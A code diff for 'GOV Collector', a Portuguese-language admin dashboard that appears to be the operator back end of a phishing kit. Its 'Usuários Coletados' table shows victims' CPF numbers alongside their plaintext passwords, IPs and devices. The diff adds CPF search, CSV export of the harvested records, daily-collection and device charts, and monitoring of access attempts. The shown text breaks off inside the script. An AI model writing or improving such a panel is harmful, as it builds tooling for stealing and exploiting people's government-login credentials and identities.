@@ -3,9 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Panel - Dados Coletados</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <title>GOV Collector | Admin Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <style>
         * {
             margin: 0;
@@ -15,37 +16,56 @@
 
         body {
             font-family: 'Inter', sans-serif;
-            transition: background 0.3s ease, color 0.3s ease;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
-        /* Tema Escuro (padrão) */
+        /* ========== TEMAS ========== */
         body.dark {
-            --bg-primary: #0a0a0a;
-            --bg-secondary: #111111;
-            --bg-card: #1a1a1a;
+            --bg-primary: #0f0f12;
+            --bg-secondary: #1a1a1f;
+            --bg-card: #1f1f24;
+            --bg-sidebar: #0a0a0e;
             --text-primary: #ffffff;
-            --text-secondary: #a0a0a0;
-            --border: #2a2a2a;
-            --accent: #00ff88;
-            --accent-hover: #00cc66;
-            --danger: #ff4444;
-            --danger-hover: #cc0000;
-            --warning: #ffaa00;
+            --text-secondary: #a0a0b0;
+            --text-muted: #6b6b7a;
+            --border: #2a2a30;
+            --border-light: #2f2f35;
+            --accent: #6366f1;
+            --accent-hover: #8183f4;
+            --accent-light: rgba(99, 102, 241, 0.1);
+            --success: #10b981;
+            --success-light: rgba(16, 185, 129, 0.1);
+            --danger: #ef4444;
+            --danger-light: rgba(239, 68, 68, 0.1);
+            --warning: #f59e0b;
+            --warning-light: rgba(245, 158, 11, 0.1);
+            --info: #3b82f6;
+            --info-light: rgba(59, 130, 246, 0.1);
+            --gradient: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
         }
 
-        /* Tema Claro */
         body.light {
-            --bg-primary: #f5f5f5;
+            --bg-primary: #f8fafc;
             --bg-secondary: #ffffff;
             --bg-card: #ffffff;
-            --text-primary: #1a1a1a;
-            --text-secondary: #666666;
-            --border: #e0e0e0;
-            --accent: #0066cc;
-            --accent-hover: #0052a3;
-            --danger: #dc3545;
-            --danger-hover: #b02a37;
-            --warning: #ffc107;
+            --bg-sidebar: #f1f5f9;
+            --text-primary: #0f172a;
+            --text-secondary: #475569;
+            --text-muted: #94a3b8;
+            --border: #e2e8f0;
+            --border-light: #e2e8f0;
+            --accent: #4f46e5;
+            --accent-hover: #6366f1;
+            --accent-light: rgba(79, 70, 229, 0.1);
+            --success: #10b981;
+            --success-light: rgba(16, 185, 129, 0.1);
+            --danger: #ef4444;
+            --danger-light: rgba(239, 68, 68, 0.1);
+            --warning: #f59e0b;
+            --warning-light: rgba(245, 158, 11, 0.1);
+            --info: #3b82f6;
+            --info-light: rgba(59, 130, 246, 0.1);
+            --gradient: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
         }
 
         body {
@@ -53,14 +73,14 @@
             color: var(--text-primary);
         }
 
-        /* Login Screen */
+        /* ========== LOGIN SCREEN ========== */
         .login-screen {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+            background: var(--gradient);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -70,111 +90,167 @@
         .login-card {
             background: var(--bg-card);
             padding: 40px;
-            border-radius: 20px;
+            border-radius: 24px;
             width: 100%;
-            max-width: 400px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+            max-width: 420px;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
+            backdrop-filter: blur(10px);
             border: 1px solid var(--border);
+            animation: fadeInUp 0.5s ease;
         }
 
-        .login-card h1 {
-            text-align: center;
-            margin-bottom: 10px;
-            color: var(--accent);
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
-        .login-card p {
+        .login-header {
             text-align: center;
             margin-bottom: 30px;
+        }
+
+        .login-header .logo {
+            width: 60px;
+            height: 60px;
+            background: var(--gradient);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+        }
+
+        .login-header h1 {
+            font-size: 28px;
+            font-weight: 700;
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .login-header p {
+            color: var(--text-secondary);
+            font-size: 14px;
+            margin-top: 8px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 8px;
             color: var(--text-secondary);
         }
 
-        .login-card input {
+        .input-group input {
             width: 100%;
-            padding: 12px 16px;
-            margin-bottom: 16px;
+            padding: 14px 16px;
             background: var(--bg-primary);
             border: 1px solid var(--border);
-            border-radius: 10px;
+            border-radius: 12px;
             color: var(--text-primary);
             font-size: 14px;
+            transition: all 0.2s;
         }
 
-        .login-card input:focus {
+        .input-group input:focus {
             outline: none;
             border-color: var(--accent);
+            box-shadow: 0 0 0 3px var(--accent-light);
         }
 
-        .login-card button {
+        .btn-login {
             width: 100%;
-            padding: 12px;
-            background: var(--accent);
+            padding: 14px;
+            background: var(--gradient);
             color: white;
             border: none;
-            border-radius: 10px;
+            border-radius: 12px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: background 0.3s;
+            transition: transform 0.2s, opacity 0.2s;
         }
 
-        .login-card button:hover {
-            background: var(--accent-hover);
+        .btn-login:hover {
+            transform: translateY(-2px);
+            opacity: 0.9;
         }
 
-        .error-msg {
-            background: var(--danger);
-            color: white;
-            padding: 10px;
-            border-radius: 8px;
-            margin-bottom: 16px;
-            text-align: center;
-            font-size: 14px;
-        }
-
-        /* Admin Panel */
+        /* ========== ADMIN PANEL ========== */
         .admin-container {
             display: none;
+            min-height: 100vh;
         }
 
         .admin-container.visible {
-            display: flex;
+            display: block;
         }
 
         /* Sidebar */
         .sidebar {
-            width: 280px;
-            min-height: 100vh;
-            background: var(--bg-secondary);
-            border-right: 1px solid var(--border);
             position: fixed;
             left: 0;
             top: 0;
-            transition: all 0.3s;
-            z-index: 100;
+            width: 280px;
+            height: 100vh;
+            background: var(--bg-sidebar);
+            border-right: 1px solid var(--border);
+            display: flex;
+            flex-direction: column;
+            transition: transform 0.3s ease;
+            z-index: 200;
         }
 
         .sidebar-header {
-            padding: 24px;
+            padding: 28px 24px;
             border-bottom: 1px solid var(--border);
         }
 
+        .sidebar-header .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .sidebar-header .logo-icon {
+            width: 40px;
+            height: 40px;
+            background: var(--gradient);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
         .sidebar-header h2 {
-            color: var(--accent);
-            font-size: 20px;
+            font-size: 18px;
+            font-weight: 700;
         }
 
         .sidebar-header p {
-            color: var(--text-secondary);
-            font-size: 12px;
-            margin-top: 5px;
+            font-size: 11px;
+            color: var(--text-muted);
+            margin-top: 4px;
         }
 
-        .sidebar-menu {
-            padding: 20px;
+        .sidebar-nav {
+            flex: 1;
+            padding: 24px 16px;
         }
 
-        .menu-item {
+        .nav-item {
             display: flex;
             align-items: center;
             gap: 12px;
@@ -182,38 +258,48 @@
             margin-bottom: 8px;
             border-radius: 12px;
             cursor: pointer;
-            transition: all 0.3s;
+            transition: all 0.2s;
             color: var(--text-secondary);
         }
 
-        .menu-item:hover {
-            background: var(--bg-primary);
-            color: var(--text-primary);
+        .nav-item:hover {
+            background: var(--accent-light);
+            color: var(--accent);
         }
 
-        .menu-item.active {
-            background: var(--accent);
-            color: white;
+        .nav-item.active {
+            background: var(--accent-light);
+            color: var(--accent);
         }
 
-        .menu-item i {
+        .nav-item i {
             width: 24px;
+            font-size: 18px;
+        }
+
+        .nav-item span {
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .nav-item .badge {
+            margin-left: auto;
+            background: var(--danger);
+            color: white;
+            padding: 2px 8px;
+            border-radius: 20px;
+            font-size: 10px;
         }
 
         .sidebar-footer {
-            position: absolute;
-            bottom: 20px;
-            left: 0;
-            right: 0;
-            padding: 20px;
+            padding: 20px 16px;
             border-top: 1px solid var(--border);
         }
 
         /* Main Content */
         .main-content {
             margin-left: 280px;
-            padding: 24px;
-            width: calc(100% - 280px);
+            padding: 24px 32px;
         }
 
         /* Top Bar */
@@ -221,94 +307,226 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 24px;
+            margin-bottom: 28px;
             padding: 16px 24px;
             background: var(--bg-card);
-            border-radius: 16px;
+            border-radius: 20px;
             border: 1px solid var(--border);
         }
 
-        .theme-toggle {
+        .page-title h1 {
+            font-size: 24px;
+            font-weight: 700;
+        }
+
+        .page-title p {
+            color: var(--text-secondary);
+            font-size: 13px;
+            margin-top: 4px;
+        }
+
+        .top-bar-actions {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+
+        .theme-toggle, .home-btn, .refresh-btn {
             background: var(--bg-primary);
             border: 1px solid var(--border);
-            padding: 8px 16px;
-            border-radius: 30px;
+            padding: 10px 16px;
+            border-radius: 12px;
             cursor: pointer;
             display: flex;
             align-items: center;
             gap: 8px;
             color: var(--text-primary);
+            transition: all 0.2s;
         }
 
-        .home-btn {
-            background: var(--bg-primary);
-            border: 1px solid var(--border);
-            padding: 8px 16px;
-            border-radius: 30px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            color: var(--text-primary);
-            text-decoration: none;
+        .theme-toggle:hover, .home-btn:hover, .refresh-btn:hover {
+            background: var(--accent-light);
+            border-color: var(--accent);
         }
 
         .logout-btn {
             background: var(--danger);
             border: none;
-            padding: 8px 20px;
-            border-radius: 30px;
-            cursor: pointer;
+            padding: 10px 20px;
+            border-radius: 12px;
             color: white;
             font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.2s;
+        }
+
+        .logout-btn:hover {
+            background: var(--danger);
+            opacity: 0.9;
+            transform: translateY(-1px);
         }
 
         /* Stats Cards */
         .stats-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            grid-template-columns: repeat(4, 1fr);
             gap: 20px;
-            margin-bottom: 24px;
+            margin-bottom: 28px;
         }
 
         .stat-card {
             background: var(--bg-card);
             border: 1px solid var(--border);
-            border-radius: 16px;
+            border-radius: 20px;
             padding: 20px;
+            transition: all 0.2s;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-2px);
+            border-color: var(--accent);
+        }
+
+        .stat-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+
+        .stat-icon {
+            width: 48px;
+            height: 48px;
+            background: var(--accent-light);
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--accent);
+            font-size: 24px;
         }
 
         .stat-value {
             font-size: 32px;
             font-weight: 700;
-            color: var(--accent);
+            margin-bottom: 4px;
         }
 
         .stat-label {
             color: var(--text-secondary);
-            font-size: 14px;
-            margin-top: 8px;
+            font-size: 13px;
         }
 
-        /* Tables */
-        .section-card {
+        .stat-change {
+            font-size: 12px;
+            margin-top: 8px;
+            color: var(--success);
+        }
+
+        /* Charts */
+        .charts-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 20px;
+            margin-bottom: 28px;
+        }
+
+        .chart-card {
             background: var(--bg-card);
             border: 1px solid var(--border);
-            border-radius: 16px;
-            padding: 24px;
-            margin-bottom: 24px;
+            border-radius: 20px;
+            padding: 20px;
         }
 
-        .section-title {
-            font-size: 18px;
+        .chart-title {
+            font-size: 16px;
             font-weight: 600;
             margin-bottom: 20px;
             padding-bottom: 12px;
             border-bottom: 1px solid var(--border);
         }
 
+        canvas {
+            max-height: 250px;
+        }
+
+        /* Section Cards */
+        .section-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            margin-bottom: 28px;
+            overflow: hidden;
+        }
+
+        .section-header {
+            padding: 20px 24px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+
+        .section-title {
+            font-size: 18px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .section-actions {
+            display: flex;
+            gap: 12px;
+        }
+
+        .btn-primary {
+            background: var(--accent);
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn-danger {
+            background: var(--danger);
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn-outline {
+            background: transparent;
+            border: 1px solid var(--border);
+            color: var(--text-primary);
+            padding: 8px 16px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 13px;
+        }
+
+        /* Tables */
         .table-wrapper {
             overflow-x: auto;
+            padding: 0 24px 24px;
         }
 
         table {
@@ -317,25 +535,26 @@
         }
 
         th, td {
-            padding: 12px;
+            padding: 14px 12px;
             text-align: left;
-            border-bottom: 1px solid var(--border);
+            border-bottom: 1px solid var(--border-light);
         }
 
         th {
             color: var(--text-secondary);
-            font-weight: 500;
+            font-weight: 600;
             font-size: 12px;
             text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
 
         td {
             font-size: 13px;
         }
 
-        .senha {
+        .senha-cell {
             font-family: monospace;
-            font-weight: bold;
+            font-weight: 600;
             color: var(--warning);
         }
 
@@ -347,37 +566,100 @@
             font-weight: 600;
         }
 
-        .badge-success { background: var(--accent); color: white; }
-        .badge-danger { background: var(--danger); color: white; }
+        .badge-success { background: var(--success-light); color: var(--success); }
+        .badge-danger { background: var(--danger-light); color: var(--danger); }
+        .badge-warning { background: var(--warning-light); color: var(--warning); }
+        .badge-info { background: var(--info-light); color: var(--info); }
 
-        .btn-delete {
-            background: var(--danger);
-            border: none;
-            padding: 5px 12px;
-            border-radius: 8px;
-            color: white;
-            cursor: pointer;
-            font-size: 12px;
+        .log-item {
+            padding: 12px 24px;
+            border-bottom: 1px solid var(--border-light);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 13px;
         }
 
-        .btn-clear {
-            background: var(--warning);
-            border: none;
-            padding: 10px 20px;
-            border-radius: 8px;
-            color: #1a1a1a;
-            cursor: pointer;
-            font-weight: 600;
-        }
-
-        .log-entry {
-            padding: 8px;
-            border-bottom: 1px solid var(--border);
-            font-size: 12px;
+        .log-time {
+            color: var(--text-muted);
             font-family: monospace;
+            font-size: 12px;
+            min-width: 160px;
+        }
+
+        /* Search */
+        .search-box {
+            display: flex;
+            align-items: center;
+            background: var(--bg-primary);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 8px 16px;
+        }
+
+        .search-box i {
+            color: var(--text-muted);
+        }
+
+        .search-box input {
+            background: transparent;
+            border: none;
+            padding: 6px 12px;
+            color: var(--text-primary);
+            outline: none;
+            width: 200px;
+        }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(4px);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: var(--bg-card);
+            border-radius: 24px;
+            padding: 28px;
+            max-width: 500px;
+            width: 90%;
+            border: 1px solid var(--border);
         }
 
         /* Mobile */
+        .menu-toggle {
+            display: none;
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            width: 56px;
+            height: 56px;
+            background: var(--accent);
+            border-radius: 28px;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            z-index: 300;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+        }
+
+        @media (max-width: 1024px) {
+            .stats-grid { grid-template-columns: repeat(2, 1fr); }
+            .charts-grid { grid-template-columns: 1fr; }
+        }
+
         @media (max-width: 768px) {
             .sidebar {
                 transform: translateX(-100%);
@@ -387,36 +669,28 @@
             }
             .main-content {
                 margin-left: 0;
+                padding: 16px;
+            }
+            .menu-toggle {
+                display: flex;
+            }
+            .stats-grid { grid-template-columns: 1fr; }
+            .top-bar {
+                flex-direction: column;
+                gap: 16px;
+            }
+            .top-bar-actions {
                 width: 100%;
-            }
-            .menu-toggle {
-                display: fixed;
-                bottom: 20px;
-                left: 20px;
-                position: fixed;
-                background: var(--accent);
-                padding: 12px;
-                border-radius: 50%;
-                cursor: pointer;
-                z-index: 200;
+                justify-content: center;
             }
         }
 
-        @media (min-width: 769px) {
-            .menu-toggle {
-                display: none;
-            }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
 
-        ::-webkit-scrollbar {
-            width: 8px;
-        }
-        ::-webkit-scrollbar-track {
-            background: var(--bg-primary);
-        }
-        ::-webkit-scrollbar-thumb {
-            background: var(--border);
-            border-radius: 10px;
+        .fa-spin {
+            animation: spin 1s linear infinite;
         }
     </style>
 </head>
@@ -425,56 +699,94 @@
 <!-- Login Screen -->
 <div id="loginScreen" class="login-screen">
     <div class="login-card">
-        <h1><i class="fas fa-shield-alt"></i> Admin Panel</h1>
-        <p>Acesso restrito - Digite suas credenciais</p>
-        <div id="loginError" class="error-msg" style="display: none;"></div>
-        <input type="text" id="username" placeholder="Usuário">
-        <input type="password" id="password" placeholder="Senha">
-        <button onclick="fazerLogin()"><i class="fas fa-arrow-right"></i> Entrar</button>
+        <div class="login-header">
+            <div class="logo">
+                <i class="fas fa-shield-alt" style="font-size: 28px; color: white;"></i>
+            </div>
+            <h1>GOV Collector</h1>
+            <p>Painel de Controle Administrativo</p>
+        </div>
+        <div id="loginError" style="display: none; background: var(--danger-light); color: var(--danger); padding: 12px; border-radius: 10px; margin-bottom: 20px; font-size: 13px;"></div>
+        <div class="input-group">
+            <label><i class="fas fa-user"></i> Usuário</label>
+            <input type="text" id="loginUser" placeholder="admin">
+        </div>
+        <div class="input-group">
+            <label><i class="fas fa-lock"></i> Senha</label>
+            <input type="password" id="loginPass" placeholder="••••••••">
+        </div>
+        <button class="btn-login" onclick="fazerLogin()">
+            <i class="fas fa-arrow-right"></i> Acessar Painel
+        </button>
     </div>
 </div>
 
 <!-- Admin Panel -->
 <div id="adminPanel" class="admin-container">
-    <!-- Sidebar -->
+    <div class="menu-toggle" onclick="toggleSidebar()">
+        <i class="fas fa-bars"></i>
+    </div>
+
     <aside class="sidebar" id="sidebar">
         <div class="sidebar-header">
-            <h2><i class="fas fa-database"></i> GOV Collect</h2>
-            <p>Painel de Controle</p>
+            <div class="logo">
+                <div class="logo-icon">
+                    <i class="fas fa-database"></i>
+                </div>
+                <div>
+                    <h2>GOV Collector</h2>
+                    <p>v2.0 - Security Dashboard</p>
+                </div>
+            </div>
         </div>
-        <div class="sidebar-menu">
-            <div class="menu-item active" data-tab="dashboard">
-                <i class="fas fa-chart-line"></i> Dashboard
+        <div class="sidebar-nav">
+            <div class="nav-item active" data-tab="dashboard">
+                <i class="fas fa-chart-line"></i>
+                <span>Dashboard</span>
             </div>
-            <div class="menu-item" data-tab="users">
-                <i class="fas fa-users"></i> Usuários
+            <div class="nav-item" data-tab="users">
+                <i class="fas fa-users"></i>
+                <span>Usuários</span>
+                <span class="badge" id="usersBadge">0</span>
             </div>
-            <div class="menu-item" data-tab="logs">
-                <i class="fas fa-history"></i> Logs
+            <div class="nav-item" data-tab="logs">
+                <i class="fas fa-history"></i>
+                <span>Logs</span>
             </div>
-            <div class="menu-item" data-tab="security">
-                <i class="fas fa-shield-alt"></i> Segurança
+            <div class="nav-item" data-tab="security">
+                <i class="fas fa-shield-alt"></i>
+                <span>Segurança</span>
+            </div>
+            <div class="nav-item" data-tab="settings">
+                <i class="fas fa-cog"></i>
+                <span>Configurações</span>
             </div>
         </div>
         <div class="sidebar-footer">
-            <div class="menu-item" onclick="logout()">
-                <i class="fas fa-sign-out-alt"></i> Sair
+            <div class="nav-item" onclick="logout()">
+                <i class="fas fa-sign-out-alt"></i>
+                <span>Sair</span>
             </div>
         </div>
     </aside>
 
-    <!-- Main Content -->
     <main class="main-content">
+        <!-- Top Bar -->
         <div class="top-bar">
-            <div style="display: flex; gap: 12px;">
-                <a href="/" class="home-btn" target="_blank">
+            <div class="page-title">
+                <h1 id="pageTitle">Dashboard</h1>
+                <p id="pageSubtitle">Visão geral do sistema</p>
+            </div>
+            <div class="top-bar-actions">
+                <a href="/" target="_blank" class="home-btn">
                     <i class="fas fa-home"></i> Home
                 </a>
-            </div>
-            <div style="display: flex; gap: 12px;">
+                <button class="refresh-btn" onclick="carregarTodosDados()">
+                    <i class="fas fa-sync-alt"></i> Atualizar
+                </button>
                 <button class="theme-toggle" onclick="toggleTheme()">
-                    <i class="fas fa-moon"></i>
-                    <span id="themeText">Modo Escuro</span>
+                    <i class="fas fa-moon" id="themeIcon"></i>
+                    <span id="themeText">Dark</span>
                 </button>
                 <button class="logout-btn" onclick="logout()">
                     <i class="fas fa-sign-out-alt"></i> Sair
@@ -482,33 +794,69 @@
             </div>
         </div>
 
-        <!-- Menu Mobile Toggle -->
-        <div class="menu-toggle" onclick="document.getElementById('sidebar').classList.toggle('open')">
-            <i class="fas fa-bars"></i>
-        </div>
-
         <!-- Dashboard Tab -->
         <div id="tab-dashboard" class="tab-content active">
             <div class="stats-grid" id="statsGrid"></div>
+            <div class="charts-grid">
+                <div class="chart-card">
+                    <div class="chart-title">
+                        <i class="fas fa-chart-bar"></i> Coletas por Dia
+                    </div>
+                    <canvas id="dailyChart"></canvas>
+                </div>
+                <div class="chart-card">
+                    <div class="chart-title">
+                        <i class="fas fa-chart-pie"></i> Dispositivos
+                    </div>
+                    <canvas id="deviceChart"></canvas>
+                </div>
+            </div>
             <div class="section-card">
-                <div class="section-title">Últimos Logs</div>
-                <div id="ultimosLogs" class="log-container"></div>
+                <div class="section-header">
+                    <div class="section-title">
+                        <i class="fas fa-clock"></i> Últimas Atividades
+                    </div>
+                    <button class="btn-outline" onclick="carregarTodosDados()">
+                        <i class="fas fa-sync-alt"></i> Atualizar
+                    </button>
+                </div>
+                <div id="ultimasAtividades"></div>
             </div>
         </div>
 
         <!-- Users Tab -->
         <div id="tab-users" class="tab-content">
             <div class="section-card">
-                <div class="section-title">
-                    Usuários Coletados
-                    <button class="btn-clear" style="float: right;" onclick="limparDados()">
-                        <i class="fas fa-trash"></i> Limpar Todos
-                    </button>
+                <div class="section-header">
+                    <div class="section-title">
+                        <i class="fas fa-users"></i> Usuários Coletados
+                        <span id="totalUsersSpan" style="font-size: 12px; color: var(--text-muted);"></span>
+                    </div>
+                    <div class="section-actions">
+                        <div class="search-box">
+                            <i class="fas fa-search"></i>
+                            <input type="text" id="searchUsers" placeholder="Buscar CPF..." onkeyup="filtrarUsuarios()">
+                        </div>
+                        <button class="btn-danger" onclick="limparTodosDados()">
+                            <i class="fas fa-trash-alt"></i> Limpar Tudo
+                        </button>
+                        <button class="btn-primary" onclick="exportarCSV()">
+                            <i class="fas fa-download"></i> Exportar CSV
+                        </button>
+                    </div>
                 </div>
                 <div class="table-wrapper">
                     <table>
                         <thead>
-                            <tr><th>CPF</th><th>SENHA</th><th>IP</th><th>Dispositivo</th><th>Navegador</th><th>Data</th><th>Ação</th</rot>
+                            <tr>
+                                <th>CPF</th>
+                                <th>SENHA</th>
+                                <th>IP</th>
+                                <th>Dispositivo</th>
+                                <th>Navegador</th>
+                                <th>Data</th>
+                                <th>Ações</th>
+                            </tr>
                         </thead>
                         <tbody id="usersTable"></tbody>
                     </table>
@@ -519,22 +867,91 @@
         <!-- Logs Tab -->
         <div id="tab-logs" class="tab-content">
             <div class="section-card">
-                <div class="section-title">Histórico de Atividades</div>
-                <div id="logsList" class="log-container"></div>
+                <div class="section-header">
+                    <div class="section-title">
+                        <i class="fas fa-history"></i> Histórico de Atividades
+                    </div>
+                    <div class="section-actions">
+                        <div class="search-box">
+                            <i class="fas fa-search"></i>
+                            <input type="text" id="searchLogs" placeholder="Buscar..." onkeyup="filtrarLogs()">
+                        </div>
+                        <button class="btn-outline" onclick="carregarTodosDados()">
+                            <i class="fas fa-sync-alt"></i> Atualizar
+                        </button>
+                    </div>
+                </div>
+                <div id="logsList"></div>
             </div>
         </div>
 
         <!-- Security Tab -->
         <div id="tab-security" class="tab-content">
+            <div class="stats-grid" style="margin-bottom: 20px;">
+                <div class="stat-card">
+                    <div class="stat-header">
+                        <div class="stat-icon"><i class="fas fa-shield-alt"></i></div>
+                    </div>
+                    <div class="stat-value" id="tentativasHoje">0</div>
+                    <div class="stat-label">Tentativas hoje</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-header">
+                        <div class="stat-icon"><i class="fas fa-ip"></i></div>
+                    </div>
+                    <div class="stat-value" id="ipsDiferentes">0</div>
+                    <div class="stat-label">IPs diferentes</div>
+                </div>
+            </div>
             <div class="section-card">
-                <div class="section-title">Tentativas de Acesso ao Admin</div>
+                <div class="section-header">
+                    <div class="section-title">
+                        <i class="fas fa-list"></i> Tentativas de Acesso
+                    </div>
+                </div>
                 <div class="table-wrapper">
                     <table>
                         <thead>
-                            <tr><th>IP</th><th>Tentativa</th><th>Data</th></tr>
+                            <tr>
+                                <th>IP</th>
+                                <th>Tentativa</th>
+                                <th>Data</th>
+                            </tr>
                         </thead>
                         <tbody id="tentativasTable"></tbody>
                     </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- Settings Tab -->
+        <div id="tab-settings" class="tab-content">
+            <div class="section-card">
+                <div class="section-header">
+                    <div class="section-title">
+                        <i class="fas fa-cog"></i> Configurações do Sistema
+                    </div>
+                </div>
+                <div style="padding: 24px;">
+                    <div style="margin-bottom: 24px;">
+                        <h3 style="margin-bottom: 12px;">Alterar Senha do Admin</h3>
+                        <div style="display: flex; gap: 12px; flex-wrap: wrap;">
+                            <input type="password" id="novaSenha" placeholder="Nova senha" style="flex: 1; padding: 12px; background: var(--bg-primary); border: 1px solid var(--border); border-radius: 10px; color: var(--text-primary);">
+                            <button class="btn-primary" onclick="alterarSenha()">
+                                <i class="fas fa-key"></i> Alterar Senha
+                            </button>
+                        </div>
+                        <div id="senhaMsg" style="margin-top: 10px; font-size: 13px;"></div>
+                    </div>
+                    
+                    <div>
+                        <h3 style="margin-bottom: 12px;">Dados do Sistema</h3>
+                        <div style="background: var(--bg-primary); padding: 16px; border-radius: 12px;">
+                            <p><strong>Versão:</strong> 2.0.0</p>
+                            <p><strong>Última atualização:</strong> <span id="ultimaAtualizacao">-</span></p>
+                            <p><strong>Status:</strong> <span class="badge badge-success">Online</span></p>
+                        </div>
+                    </div>
                 </div>
             </div>
         </div>
@@ -543,10 +960,15 @@
 
 <script>
     let adminToken = null;
+    let refreshInterval = null;
+    let dailyChart, deviceChart;
+    let allUsers = [];
+    let allLogs = [];
 
+    // ========== LOGIN ==========
     async function fazerLogin() {
-        const username = document.getElementById('username').value;
-        const password = document.getElementById('password').value;
+        const username = document.getElementById('loginUser').value;
+        const password = document.getElementById('loginPass').value;
         const errorDiv = document.getElementById('loginError');
         
         if (!username || !password) {
@@ -561,7 +983,6 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ username, password })
             });
-            
             const data = await res.json();
             
             if (data.success) {
@@ -570,7 +991,7 @@
                 document.cookie = `admin_token=${adminToken}; path=/; Secure; SameSite=Strict`;
                 document.getElementById('loginScreen').style.display = 'none';
                 document.getElementById('adminPanel').classList.add('visible');
-                carregarDados();
+                carregarTodosDados();
                 iniciarRefresh();
             } else {
                 errorDiv.style.display = 'block';
@@ -578,10 +999,10 @@
             }
         } catch (error) {
             errorDiv.style.display = 'block';
-            errorDiv.innerHTML = 'Erro ao conectar';
+            errorDiv.innerHTML = 'Erro ao conectar com o servidor';
         }
     }
-    
+
     function logout() {
         fetch('/api/admin/logout', { method: 'POST' });
         localStorage.removeItem('admin_token');
@@ -590,28 +1011,144 @@
         document.getElementById('loginScreen').style.display = 'flex';
         if (refreshInterval) clearInterval(refreshInterval);
     }
-    
+
+    // ========== TEMA ==========
     function toggleTheme() {
         const body = document.body;
+        const themeIcon = document.getElementById('themeIcon');
         const themeText = document.getElementById('themeText');
+        
         if (body.classList.contains('dark')) {
             body.classList.remove('dark');
             body.classList.add('light');
-            themeText.innerHTML = 'Modo Claro';
+            themeIcon.className = 'fas fa-sun';
+            themeText.innerHTML = 'Light';
             localStorage.setItem('theme', 'light');
         } else {
             body.classList.remove('light');
             body.classList.add('dark');
-            themeText.innerHTML = 'Modo Escuro';
+            themeIcon.className = 'fas fa-moon';
+            themeText.innerHTML = 'Dark';
             localStorage.setItem('theme', 'dark');
         }
     }
-    
+
     // Carregar tema salvo
     if (localStorage.getItem('theme') === 'light') {
         document.body.classList.remove('dark');
         document.body.classList.add('light');
-        document.getElementById('themeText').innerHTML = 'Modo Claro';
+        document.getElementById('themeIcon').className = 'fas fa-sun';
+        document.getElementById('themeText').innerHTML = 'Light';
+    }
+
